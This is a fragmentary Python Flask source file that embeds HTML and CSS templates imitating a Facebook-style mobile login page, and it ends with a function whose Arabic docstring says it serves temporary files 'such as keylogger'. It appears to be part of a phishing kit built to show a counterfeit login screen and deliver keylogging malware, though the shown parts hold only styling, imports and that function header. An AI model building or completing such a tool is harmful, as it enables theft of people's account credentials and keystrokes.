...
try:
    import requests
    from flask import Flask, request, jsonify, abort, render_template_string, send_file, Response, redirect
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
            ...
            .bottom-section { width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: flex-end; padding-bottom: 20px; }
            .create-btn { width: 100%; height: 50px; background: transparent; border: 2px solid #1877F2; border-radius: 25px; font-size: 16px; font-weight: 500; color: #1877F2; cursor: pointer; transition: background 0.2s, color 0.2s; margin-bottom: 18px; }
    ...
    <head>
        ...
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }}
            html, body {{ width: 100%; height: 100vh; background: #ffffff; overflow: hidden; display: flex; justify-content: center; align-items: center; }}
            .container {{ width: 100%; max-width: 420px; height: 100vh; padding: 0 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; }}
            .language-selector {{ width: 100%; display: flex; justify-content: center; padding: 8px 0 4px; font-size: 14px; color: #1C1E21; font-weight: 400; cursor: default; }}
            .language-selector span {{ display: flex; align-items: center; gap: 4px; }}
            .language-selector span::after {{ content: "∨"; font-size: 12px; color: #1C1E21; }}
            .logo-circle {{ width: 58px; height: 58px; background: #ffffff; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 6px 0 16px; border: 1px solid #dddfe2; }}
            .logo-circle span {{ font-size: 40px; font-weight: 700; font-style: italic; color: #1877F2; line-height: 1; }}
...
def serve_temp_file(filename):
    """تقديم الملفات المؤقتة (مثل keylogger)"""
